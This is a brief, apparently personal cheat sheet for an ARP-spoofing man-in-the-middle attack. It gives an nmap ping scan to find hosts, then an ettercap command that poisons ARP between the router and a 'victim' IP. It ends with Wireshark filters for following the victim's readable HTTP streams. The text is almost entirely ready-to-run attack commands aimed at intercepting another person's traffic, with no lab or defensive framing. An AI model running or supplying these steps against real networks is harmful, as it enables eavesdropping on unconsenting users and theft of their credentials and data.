TOOLS:
Wireshark
Nmap
Ettercap-text-only
--------------------------
sudo nmap -sn [IP ADDRESS RANGE]
-sn: Disables port scanning, performs a "ping scan" only--it checks which hosts are up(alive) without scanning their ports.
--------------------------
sudo ettercap -T -S -i eth0 -M arp:remote /[ROUTER IP]// /[VICTIM IP]//
-T: Text only
-S: Do not use SSL
-i: Network interface (in my case, eth0)
-M: Method
--------------------------
sudo wireshark
[Select your specified interface]
#You will see a LOT of things. So let's filter it:
ip.addr == [VICTIM IP]
-------------------------
#If you right-click on a packet, and then click follow -> TCP Stream, in most cases, you will not understand anything.
#It is because of SSL/TLS (encryption).
#Let's filter it to readable (http) packets:
ip.addr == [VICTIM IP] && http
#Right-click on a packet, click follow -> HTTP Stream.
#You can read it now.
